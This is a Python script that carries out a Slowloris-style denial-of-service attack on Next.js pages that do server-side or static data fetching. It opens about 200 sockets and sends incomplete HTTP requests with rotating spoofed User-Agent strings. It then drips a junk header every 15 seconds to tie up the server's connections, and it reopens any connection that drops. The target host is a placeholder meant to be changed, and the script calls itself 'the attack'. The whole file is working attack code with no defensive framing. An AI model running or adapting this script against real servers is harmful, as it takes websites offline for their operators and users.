import sys
import socket
import time
import random

# Target host and port (adjust as needed)
TARGET_HOST = 'localhost'
TARGET_PORT = 3000

# Number of sockets to create
SOCKET_COUNT = 200

# The specific Next.js page routes that use getStaticProps, getServerSideProps, or getInitialProps
TARGET_PATHS = [
    '/page-with-getStaticProps',
    '/page-with-getServerSideProps',
    '/page-with-getInitialProps'
]

# User-Agent strings for the HTTP requests
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

def init_socket(path):
    """Initialize a socket connection to the target path"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET_HOST, TARGET_PORT))
    
    # Send a partial HTTP request to the specific page path
    s.send(f"GET {path}?{random.randint(0, 1000)} HTTP/1.1\r\n".encode('utf-8'))
    s.send(f"Host: {TARGET_HOST}\r\n".encode('utf-8'))
    s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode('utf-8'))
    return s

def main():
    sockets = []

    # Initialize sockets targeting the different paths
    for path in TARGET_PATHS:
        for _ in range(SOCKET_COUNT // len(TARGET_PATHS)):
            try:
                s = init_socket(path)
                sockets.append(s)
            except socket.error:
                break

    while True:
        print(f"Maintaining {len(sockets)} connections to {TARGET_HOST}:{TARGET_PORT}...")

        for s in list(sockets):
            try:
                # Send additional headers to keep the connection alive
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
            except socket.error:
                sockets.remove(s)
                # Reopen socket on failure
                try:
                    new_socket = init_socket(random.choice(TARGET_PATHS))
                    sockets.append(new_socket)
                except socket.error:
                    continue

        time.sleep(15)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Stopping the attack.")
        sys.exit(0)
